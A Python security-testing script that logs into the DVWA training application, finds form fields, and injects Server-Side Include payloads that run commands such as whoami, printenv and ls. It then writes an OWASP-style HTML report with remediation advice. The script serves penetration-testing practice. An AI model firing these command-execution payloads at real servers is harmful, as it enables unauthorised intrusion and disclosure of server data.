#!/usr/bin/env python3
"""
DVWA SSI Injection Testing Script
OWASP OTG-INPVAL-009 Compliance
Generates OWASP/OSCP-style HTML report
"""

import requests
from bs4 import BeautifulSoup
import argparse
import datetime
import json
import os
import sys
import urllib3
import html
import time
from urllib.parse import urljoin

# Disable SSL warnings for localhost testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DVWASSIInjectionTester:
    def __init__(self, base_url, username, password, output_file, timeout=10, delay=1):
        self.base_url = base_url.rstrip('/')
        self.login_url = urljoin(self.base_url + '/', 'login.php')
        self.timeout = timeout
        self.delay = delay
        self.username = username
        self.password = password
        self.output_file = output_file
        self.session = requests.Session()
        # Set a user agent to avoid potential blocking
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        self.endpoints = []
        print(f"[*] Base URL: {self.base_url}")
        print(f"[*] Login URL: {self.login_url}")
        
    def get_csrf_token(self, url):
        """Extract CSRF token from page"""
        try:
            print(f"[*] Fetching page: {url}")
            response = self.session.get(url, verify=False, timeout=self.timeout)
            print(f"[*] Response status: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Try multiple methods to find CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            if not token_input:
                # Try finding by ID
                token_input = soup.find('input', {'id': 'user_token'})
            if not token_input:
                # Try finding any hidden input that might be the token
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for inp in hidden_inputs:
                    if inp.get('name') and 'token' in inp.get('name').lower():
                        token_input = inp
                        break
            
            if token_input and token_input.get('value'):
                token = token_input['value']
                print(f"[+] Found CSRF token: {token[:20]}...")
                return token
            else:
                print("[-] CSRF token input not found in HTML")
                return None
                
        except Exception as e:
            print(f"[-] Error getting CSRF token: {e}")
            return None
    
    def login(self):
        """Login to DVWA"""
        print("[*] Logging into DVWA...")
        try:
            # First, get the main page to establish session
            print("[*] Getting main page to establish session...")
            main_response = self.session.get(self.base_url, verify=False, timeout=self.timeout)
            print(f"[*] Main page response status: {main_response.status_code}")
            
            # Get login page to extract CSRF token
            token = self.get_csrf_token(self.login_url)
            if not token:
                print("[-] Failed to get CSRF token")
                return False
            
            # Perform login
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login',
                'user_token': token
            }
            
            print("[*] Sending login request...")
            response = self.session.post(self.login_url, data=login_data, allow_redirects=True, verify=False, timeout=self.timeout)
            
            # Check if login was successful
            if "Login failed" in response.text or "login.php" in response.url:
                print("[-] Login failed")
                print(f"Response URL: {response.url}")
                return False
            
            print("[+] Login successful")
            return True
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection error - make sure DVWA is running on localhost")
            return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False
    
    def discover_endpoints(self):
        """Discover input endpoints in DVWA"""
        print("[*] Discovering input endpoints...")
        
        # Common DVWA modules to test
        dvwa_modules = [
            'vulnerabilities/exec/',      # Command Execution
            'vulnerabilities/xss_r/',     # Reflected XSS
            'vulnerabilities/xss_s/',     # Stored XSS
            'vulnerabilities/sqli/',      # SQL Injection
            'vulnerabilities/sqli_blind/', # Blind SQL Injection
            'vulnerabilities/upload/',    # File Upload
            'vulnerabilities/captcha/',   # CAPTCHA
        ]
        
        for module in dvwa_modules:
            module_url = urljoin(self.base_url + '/', module)
            try:
                print(f"[*] Checking module: {module}")
                response = self.session.get(module_url, verify=False, timeout=self.timeout)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all forms
                    forms = soup.find_all('form')
                    for i, form in enumerate(forms):
                        action = form.get('action', '')
                        method = form.get('method', 'GET').upper()
                        
                        # Resolve relative URLs
                        if action:
                            full_action = urljoin(module_url, action)
                        else:
                            full_action = module_url
                        
                        # Extract form parameters
                        params = []
                        for input_field in form.find_all(['input', 'textarea', 'select']):
                            param_name = input_field.get('name')
                            param_type = input_field.get('type', 'text')
                            if param_name and param_type in ['text', 'textarea', 'search', 'email', 'url', 'tel']:
                                params.append({
                                    'name': param_name,
                                    'type': param_type
                                })
                        
                        if params:  # Only add endpoints that have text-based parameters
                            endpoint_info = {
                                'url': full_action,
                                'method': method,
                                'parameters': params,
                                'module': module
                            }
                            
                            # Avoid duplicates
                            if endpoint_info not in self.endpoints:
                                self.endpoints.append(endpoint_info)
                                param_names = [p['name'] for p in params]
                                print(f"[+] Found endpoint: {full_action} with text params: {param_names}")
                
            except Exception as e:
                print(f"[-] Error checking module {module}: {e}")
        
        print(f"[+] Discovered {len(self.endpoints)} endpoints")
    
    def test_ssi_injection(self):
        """Test SSI Injection on discovered endpoints"""
        print("[*] Testing SSI Injection...")
        
        # SSI payloads to test
        ssi_payloads = [
            {
                'name': 'Basic Command Execution',
                'payload': '<!--#exec cmd="echo SSI-INJECTION-DETECTED"-->',
                'expected': 'SSI-INJECTION-DETECTED'
            },
            {
                'name': 'Whoami Command',
                'payload': '<!--#exec cmd="whoami"-->',
                'expected': ['root', 'administrator', 'www-data', 'apache', 'nginx']
            },
            {
                'name': 'Echo Variable',
                'payload': '<!--#echo var="DOCUMENT_NAME"-->',
                'expected': ['.php', '.html']
            },
            {
                'name': 'Echo Remote Address',
                'payload': '<!--#echo var="REMOTE_ADDR"-->',
                'expected': ['127.0.0.1', 'localhost']
            },
            {
                'name': 'Date Injection',
                'payload': '<!--#config timefmt="%D %E %t SSI-INJECTION-DETECTED %t %D %E"--><!--#echo var="DATE_LOCAL"-->',
                'expected': 'SSI-INJECTION-DETECTED'
            },
            {
                'name': 'Printenv Command',
                'payload': '<!--#exec cmd="printenv"-->',
                'expected': ['PATH', 'HOME', 'USER']
            },
            {
                'name': 'Directory Listing',
                'payload': '<!--#exec cmd="ls"-->',
                'expected': ['index', 'config', 'login']
            },
            {
                'name': 'Directory Listing (Windows)',
                'payload': '<!--#exec cmd="dir"-->',
                'expected': ['Directory', 'File(s)', '.php']
            }
        ]
        
        for endpoint in self.endpoints:
            url = endpoint['url']
            method = endpoint['method']
            parameters = endpoint['parameters']
            module = endpoint['module']
            
            print(f"[*] Testing endpoint: {url} ({method})")
            
            # Test each parameter with SSI payloads
            for param in parameters:
                param_name = param['name']
                print(f"  [*] Testing parameter: {param_name}")
                
                # Test each SSI payload
                for ssi_test in ssi_payloads:
                    payload_name = ssi_test['name']
                    payload_value = ssi_test['payload']
                    expected_result = ssi_test['expected']
                    
                    try:
                        print(f"    [*] Testing {payload_name}")
                        
                        # Respect delay between requests
                        time.sleep(self.delay)
                        
                        # Create data with SSI payload
                        data = {}
                        for p in parameters:
                            if p['name'] == param_name:
                                data[p['name']] = payload_value
                            else:
                                # Set default values for other parameters
                                if 'name' in p['name'].lower():
                                    data[p['name']] = 'test'
                                elif 'cmd' in p['name'].lower() or 'command' in p['name'].lower():
                                    data[p['name']] = 'whoami'
                                elif 'ip' in p['name'].lower():
                                    data[p['name']] = '127.0.0.1'
                                elif 'text' in p['name'].lower() or 'message' in p['name'].lower():
                                    data[p['name']] = 'test message'
                                else:
                                    data[p['name']] = 'test'
                        
                        # Send request based on method
                        if method == 'GET':
                            response = self.session.get(url, params=data, verify=False, timeout=self.timeout)
                        else:  # POST
                            response = self.session.post(url, data=data, verify=False, timeout=self.timeout)
                        
                        # Analyze response
                        result = {
                            'url': url,
                            'module': module,
                            'method': method,
                            'parameter': param_name,
                            'payload_name': payload_name,
                            'payload': payload_value,
                            'status_code': response.status_code,
                            'response_length': len(response.text),
                            'vulnerable': False,
                            'description': '',
                            'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text
                        }
                        
                        # Check for SSI injection indicators
                        response_lower = response.text.lower()
                        
                        if isinstance(expected_result, list):
                            # Check for any of the expected strings
                            for expected in expected_result:
                                if expected.lower() in response_lower:
                                    result['vulnerable'] = True
                                    result['description'] = f"Found expected result: {expected}"
                                    break
                        else:
                            # Check for single expected string
                            if expected_result.lower() in response_lower:
                                result['vulnerable'] = True
                                result['description'] = f"Found expected result: {expected_result}"
                        
                        # Additional checks for common SSI indicators
                        ssi_indicators = [
                            'ssi-injection-detected',
                            'document_name',
                            'remote_addr',
                            'server_software',
                            'gateway_interface'
                        ]
                        
                        for indicator in ssi_indicators:
                            if indicator in response_lower and not result['vulnerable']:
                                result['vulnerable'] = True
                                result['description'] = f"Found SSI indicator: {indicator}"
                                break
                        
                        # Special check for command output
                        if 'whoami' in payload_value.lower():
                            privileged_users = ['root', 'administrator', 'www-data', 'apache', 'nginx']
                            for user in privileged_users:
                                if user in response_lower:
                                    result['vulnerable'] = True
                                    result['description'] = f"Command execution detected: {user}"
                                    break
                        
                        self.results.append(result)
                        
                        if result['vulnerable']:
                            print(f"    [+] VULNERABLE: {payload_name} on {param_name} - {result['description']}")
                        
                    except Exception as e:
                        print(f"    [-] Error testing {payload_name} on {param_name}: {e}")
                        self.results.append({
                            'url': url,
                            'module': module,
                            'method': method,
                            'parameter': param_name,
                            'payload_name': payload_name,
                            'payload': payload_value,
                            'status_code': 0,
                            'response_length': 0,
                            'vulnerable': False,
                            'description': f'Error: {str(e)}',
                            'error': True
                        })
    
    def generate_html_report(self):
        """Generate OWASP/OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSI Injection Assessment - DVWA (OTG-INPVAL-009)</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .header {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.2em;
        }}
        .header p {{
            margin: 10px 0 0 0;
            opacity: 0.9;
        }}
        .section {{
            background: white;
            margin-bottom: 25px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .section-title {{
            color: #2a5298;
            border-bottom: 2px solid #2a5298;
            padding-bottom: 10px;
            margin-top: 0;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #2a5298;
            color: white;
        }}
        tr:nth-child(even) {{
            background-color: #f2f2f2;
        }}
        .vulnerable {{
            background-color: #ffebee;
            color: #c62828;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .not-vulnerable {{
            background-color: #e8f5e8;
            color: #2e7d32;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .code {{
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
            white-space: pre-wrap;
        }}
        .risk-high {{
            color: #d32f2f;
            font-weight: bold;
        }}
        .risk-medium {{
            color: #f57c00;
            font-weight: bold;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }}
        .summary-box {{
            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 5px solid #1e88e5;
        }}
        .findings-summary {{
            display: flex;
            justify-content: space-around;
            text-align: center;
            margin: 20px 0;
        }}
        .finding-item {{
            padding: 15px;
            border-radius: 8px;
            color: white;
        }}
        .finding-vuln {{
            background-color: #d32f2f;
        }}
        .finding-safe {{
            background-color: #388e3c;
        }}
        code {{
            font-family: 'Courier New', monospace;
            background-color: #f5f5f5;
            padding: 2px 4px;
            border-radius: 3px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>SSI Injection Assessment</h1>
        <p>DVWA Security Test - OWASP Testing Guide OTG-INPVAL-009</p>
    </div>

    <div class="section">
        <h2 class="section-title">Executive Summary</h2>
        <div class="summary-box">
            <p>This assessment identified <span class="risk-high">{vulnerable_count} SSI Injection vulnerabilities</span> in the DVWA application. Server-Side Includes (SSI) Injection occurs when applications process user input as SSI directives, potentially allowing attackers to execute commands, include files, or access sensitive server information.</p>
        </div>
        <div class="findings-summary">
            <div class="finding-item finding-vuln">
                <h3>{vulnerable_count}</h3>
                <p>Vulnerable Tests</p>
            </div>
            <div class="finding-item finding-safe">
                <h3>{len(self.results) - vulnerable_count}</h3>
                <p>Secure Tests</p>
            </div>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Test Details</h2>
        <table>
            <tr>
                <td><strong>Target Application</strong></td>
                <td>Damn Vulnerable Web Application (DVWA)</td>
            </tr>
            <tr>
                <td><strong>Test Type</strong></td>
                <td>SSI Injection</td>
            </tr>
            <tr>
                <td><strong>OWASP Test ID</strong></td>
                <td>OTG-INPVAL-009</td>
            </tr>
            <tr>
                <td><strong>Risk Level</strong></td>
                <td><span class="risk-high">High</span></td>
            </tr>
            <tr>
                <td><strong>Test Date</strong></td>
                <td>{timestamp}</td>
            </tr>
            <tr>
                <td><strong>Target URL</strong></td>
                <td>{self.base_url}</td>
            </tr>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Methodology</h2>
        <p>The testing methodology followed the OWASP Testing Guide for SSI Injection:</p>
        <ol>
            <li><strong>Authentication</strong>: Logged into DVWA with provided credentials</li>
            <li><strong>Endpoint Discovery</strong>: Identified input endpoints throughout DVWA modules</li>
            <li><strong>SSI Testing</strong>: Tested various SSI injection payloads including command execution, file inclusion, and variable echoing</li>
            <li><strong>Analysis</strong>: Documented endpoints that processed SSI directives in unexpected ways</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">Findings</h2>
        <p>The following SSI injection tests were conducted:</p>
        <table>
            <thead>
                <tr>
                    <th>Module</th>
                    <th>Parameter</th>
                    <th>Method</th>
                    <th>Payload Name</th>
                    <th>Status</th>
                    <th>Status Code</th>
                </tr>
            </thead>
            <tbody>"""
        
        # Sort results by vulnerability status
        sorted_results = sorted(self.results, key=lambda x: (not x.get('vulnerable', False), x['url'], x['parameter']))
        
        for result in sorted_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            html_content += f"""
                <tr>
                    <td>{html.escape(result.get('module', 'Unknown'))}</td>
                    <td>{html.escape(result.get('parameter', 'N/A'))}</td>
                    <td>{html.escape(result.get('method', 'N/A'))}</td>
                    <td>{html.escape(result.get('payload_name', 'N/A'))}</td>
                    <td><span class="{status_class}">{status_text}</span></td>
                    <td>{result.get('status_code', 'N/A')}</td>
                </tr>"""
            
            # Add description row if vulnerable
            if result.get('vulnerable', False):
                html_content += f"""
                <tr>
                    <td colspan="6" style="background-color: #fff3e0;">
                        <strong>Description:</strong> {html.escape(result.get('description', ''))}<br>
                        <strong>Payload:</strong> {html.escape(result.get('payload', ''))}
                    </td>
                </tr>"""
        
        html_content += f"""
            </tbody>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Detailed Vulnerabilities</h2>
        <p>The following SSI Injection vulnerabilities were identified:</p>"""
        
        # Show only vulnerable results with details
        vulnerable_results = [r for r in self.results if r.get('vulnerable', False)]
        
        if vulnerable_results:
            for i, result in enumerate(vulnerable_results, 1):
                html_content += f"""
        <div class="code">
<strong>Vulnerability #{i}</strong>
Module: {html.escape(result.get('module', 'Unknown'))}
Endpoint: {html.escape(result.get('url', 'N/A'))}
Parameter: {html.escape(result.get('parameter', 'N/A'))}
Method: {html.escape(result.get('method', 'N/A'))}
Payload Name: {html.escape(result.get('payload_name', 'N/A'))}
Payload: {html.escape(result.get('payload', ''))}
Description: {html.escape(result.get('description', ''))}
Status Code: {result.get('status_code', 'N/A')}
Response Preview: {html.escape(result.get('response_preview', '')[:300])}
        </div>"""
        else:
            html_content += """
        <p>No SSI Injection vulnerabilities were found in the tested endpoints.</p>"""
        
        html_content += f"""
    </div>

    <div class="section">
        <h2 class="section-title">SSI Injection Techniques</h2>
        <p>The following SSI injection techniques were tested:</p>
        <ul>
            <li><strong>Command Execution</strong>: Using <code><!--#exec cmd="command"--></code> to execute system commands</li>
            <li><strong>Variable Echoing</strong>: Using <code><!--#echo var="variable"--></code> to display server variables</li>
            <li><strong>Date/Time Injection</strong>: Using <code><!--#config timefmt="format"--></code> to manipulate date output</li>
            <li><strong>File Inclusion</strong>: Using <code><!--#include file="filename"--></code> to include file contents</li>
        </ul>
        <p>SSI injection can lead to remote code execution, information disclosure, and server compromise.</p>
    </div>

    <div class="section">
        <h2 class="section-title">Remediation Recommendations</h2>
        <p>To prevent SSI Injection vulnerabilities, implement the following measures:</p>
        <ol>
            <li><strong>Disable SSI</strong>: Disable Server-Side Includes if not required by the application</li>
            <li><strong>Input Validation</strong>: Validate and sanitize all user input, especially for characters like <!--</li>
            <li><strong>Output Encoding</strong>: Encode user input before displaying it in web pages</li>
            <li><strong>Web Server Configuration</strong>: Configure web servers to process only trusted files with SSI directives</li>
            <li><strong>File Permissions</strong>: Restrict file permissions to prevent unauthorized file creation/modification</li>
            <li><strong>Security Testing</strong>: Include SSI injection testing in regular security assessments</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">References</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_SSI_Injection">OWASP Testing Guide - OTG-INPVAL-009</a></li>
            <li><a href="https://owasp.org/www-community/attacks/Server-Side_Includes_%28SSI%29_Injection">OWASP SSI Injection</a></li>
            <li><a href="https://cwe.mitre.org/data/definitions/97.html">CWE-97: SSI Injection</a></li>
            <li><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA) Documentation</a></li>
        </ul>
    </div>

    <div class="footer">
        <p>Generated by DVWA SSI Injection Testing Script | OWASP/OSCP-Style Report</p>
        <p>Report generated on: {timestamp}</p>
    </div>
</body>
</html>"""
        
        # Write report to file
        try:
            os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"[+] HTML report saved to: {self.output_file}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def run(self):
        """Main execution method"""
        print("=== DVWA SSI Injection Testing Script ===")
        print(f"Target: {self.base_url}")
        print(f"Output: {self.output_file}")
        print(f"Delay between requests: {self.delay}s")
        print()
        
        # Login to DVWA
        if not self.login():
            print("[-] Failed to login. Exiting.")
            return False
        
        # Discover endpoints
        self.discover_endpoints()
        
        if not self.endpoints:
            print("[-] No endpoints discovered. Exiting.")
            return False
        
        # Test SSI injection
        self.test_ssi_injection()
        
        # Generate report
        self.generate_html_report()
        
        # Summary
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        total_tests = len(self.results)
        print(f"\n=== Test Summary ===")
        print(f"Total endpoints tested: {len(self.endpoints)}")
        print(f"Total SSI injection tests: {total_tests}")
        print(f"Vulnerable cases: {vulnerable_count}")
        print(f"Security status: {'VULNERABLE' if vulnerable_count > 0 else 'SECURE'}")
        
        return True

def main():
    parser = argparse.ArgumentParser(description='DVWA SSI Injection Testing Script (OTG-INPVAL-009)')
    parser.add_argument('--url', default='http://localhost/dvwa', help='DVWA base URL (default: http://localhost/dvwa)')
    parser.add_argument('--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('--output', default='reports/ssi_injection_report.html', help='Output HTML report file (default: reports/ssi_injection_report.html)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests in seconds (default: 1.0)')
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = DVWASSIInjectionTester(args.url, args.username, args.password, args.output, args.timeout, args.delay)
    
    # Run tests
    success = tester.run()
    
    if success:
        print(f"\n[+] Testing completed successfully!")
        print(f"[+] Check report: {args.output}")
    else:
        print(f"\n[-] Testing failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()